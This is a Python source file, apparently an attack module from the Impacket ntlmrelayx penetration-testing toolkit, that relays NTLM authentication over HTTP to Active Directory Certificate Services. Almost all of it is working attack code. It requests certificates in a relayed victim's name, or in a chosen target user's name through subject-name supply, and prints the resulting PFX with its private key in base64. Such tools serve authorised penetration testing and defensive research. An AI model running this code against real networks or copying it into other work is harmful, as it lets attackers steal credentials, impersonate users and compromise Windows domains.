# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# HTTP Attack Class
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#  Brendan Ortiz (Allevon412 @ Depth Security)
# Description:
#  HTTP protocol relay attack
#
# ToDo:
#
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
import re
import base64
from OpenSSL import crypto
import requests

PROTOCOL_ATTACK_CLASS = "HTTPAttack"

class HTTPAttack(ProtocolAttack):
    """
    This is the default HTTP attack. This attack only dumps the root page, though
    you can add any complex attack below. self.client is an instance of urrlib.session
    For easy advanced attacks, use the SOCKS option and use curl or a browser to simply
    proxy through ntlmrelayx
    """
    PLUGIN_NAMES = ["HTTP", "HTTPS"]
    def run(self):
        #Default action: Dump requested page to file, named username-targetname.html

        if self.config.isADCSAttack:
            self.adcs_relay_attack()
        if self.config.Escalate:
            self.adcs_subject_supply_name_attack()
            return

        #You can also request any page on the server via self.client.session,
        #for example with:
        self.client.request("GET", "/")
        r1 = self.client.getresponse()
        print(r1.status, r1.reason)
        data1 = r1.read()
        print(data1)


    def adcs_relay_attack(self):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 4096)

        csr = self.generate_csr(key, self.username)
        csr = csr.decode().replace("\n","").replace("+", "%2b").replace(" ", "+")
        print("[*] CSR generated!")

        data = "Mode=newreq&CertRequest=%s&CertAttrib=CertificateTemplate:%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, self.config.template)

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": len(data)
        }

        print("[*] Getting certificate...")

        self.client.request("POST","/certsrv/certfnsh.asp", body=data, headers=headers)
        response = self.client.getresponse()

        if response.status != 200:
            print("[!] Error getting certificate! Make sure you have entered valid certificate template.")
            return

        content = response.read()
        #print(content)
        found = re.findall(r'location=\"certnew.cer\?ReqID(.*?)&', content.decode())
        if len(found) == 0:
            print("[!] Error obtaining certificate")
            return

        certificate_id = found[0]
        #print(certificate_id)
        self.client.request("GET", "/certsrv/certnew.cer?ReqID" + certificate_id)
        response = self.client.getresponse()
        #print(response.status, response.reason)

        cert = response.read().decode()
        if "-----BEGIN CERTIFICATE-----" not in cert:
            self.client.request("GET", "/certsrv/certnew.cer?ReqID=" + certificate_id)
            response = self.client.getresponse()
            cert = response.read().decode()

        if "-----BEGIN CERTIFICATE-----" not in cert:
            print("[!] Could not get certificate")
            print("[!] Debug the response content for reason why certificate failed")
            print(response.status, response.reason, response.content)

        print("[*] GOT CERTIFICATE!")

        certificate_store = self.generate_pfx(key, cert)
        print("[*] Base64 certificate of user %s: \n%s" % (self.username, base64.b64encode(certificate_store).decode()))
        #open("cert.pfx", "wb").write(certificate_store)
        return self.client

    def generate_csr(self, key, CN):
        print("[*] Generating CSR...")
        req = crypto.X509Req()
        req.get_subject().CN = CN
        req.set_pubkey(key)
        req.sign(key, "sha256")

        return crypto.dump_certificate_request(crypto.FILETYPE_PEM, req)

    def generate_pfx(self, key, cert):
        #print(cert)
        cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert)
        p12 = crypto.PKCS12()
        p12.set_certificate(cert)
        p12.set_privatekey(key)
        return p12.export()

    def adcs_subject_supply_name_attack(self):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 4096)

        csr = self.generate_csr(key, self.config.target_user)
        csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
        print("[*] CSR generated!")

        data = "Mode=newreq&CertRequest=%s&CertAttrib=CertificateTemplate:%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (
        csr, self.config.target_cert_name)

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": len(data)
        }

        print("[*] Getting certificate...")

        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
        response = self.client.getresponse()

        if response.status != 200:
            print("[!] Error getting certificate! Make sure you have entered valid certificate template.")
            return

        content = response.read()
        # print(content)
        found = re.findall(r'location=\"certnew.cer\?ReqID(.*?)&', content.decode())
        if len(found) == 0:
            print("[!] Error obtaining certificate")
            return

        certificate_id = found[0]
        # print(certificate_id)
        self.client.request("GET", "/certsrv/certnew.cer?ReqID" + certificate_id)
        response = self.client.getresponse()
        # print(response.status, response.reason)

        cert = response.read().decode()
        if "-----BEGIN CERTIFICATE-----" not in cert:
            self.client.request("GET", "/certsrv/certnew.cer?ReqID=" + certificate_id)
            response = self.client.getresponse()
            cert = response.read().decode()

        if "-----BEGIN CERTIFICATE-----" not in cert:
            print("[!] Could not get certificate")
            print("[!] Debug the response content for reason why certificate failed")
            print(response.status, response.reason, response.content)

        print("[*] GOT CERTIFICATE!")

        certificate_store = self.generate_pfx(key, cert)
        print("[*] Base64 certificate of user %s: \n%s" % (self.config.target_user, base64.b64encode(certificate_store).decode()))